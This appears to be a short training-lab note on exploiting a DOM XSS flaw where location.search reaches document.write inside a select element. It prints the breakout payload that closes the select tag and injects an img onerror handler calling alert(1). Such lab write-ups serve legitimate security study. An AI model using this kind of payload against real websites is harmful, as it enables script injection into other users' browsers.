Lab #10 - DOM XSS in document.write sink using source location.search inside a select element

Target Goal - Exploit the DOM XSS vulnerability to call the alert function.

Analysis:


<select name=storeId>
<option selected>Paris2</select><img src=1 onerror=alert(1)></option>

Paris2</select><img src=1 onerror=alert(1)>